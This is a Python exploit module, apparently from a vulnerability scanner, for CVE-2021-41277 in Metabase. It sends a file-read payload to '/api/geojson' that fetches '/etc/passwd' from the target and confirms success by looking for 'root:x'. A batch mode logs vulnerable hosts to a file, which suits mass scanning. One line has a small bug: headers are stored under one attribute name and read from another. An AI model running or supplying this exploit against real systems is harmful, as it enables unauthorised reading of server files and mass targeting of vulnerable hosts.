#! /usr/bin/python3
# -*- encoding: utf-8 -*-

from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests

class Cve_2021_41277:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/api/geojson?url=file:////etc/passwd'
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:x" in req.text:
                OutPrintInfoSuc("Metabase", f"存在Metabase任意文件读取 {url2}")
                if self.batch:
                    with open("./result/metabase_2021_41277.txt","a") as w:
                        w.write(f"{url2}\n")
        except:
            if not self.batch:
                OutPrintInfo("Metabase", "目标访问错误")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Metabase", "开始检测Metabase任意文件读取...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Metabase", "Metabase任意文件读取检测结束")
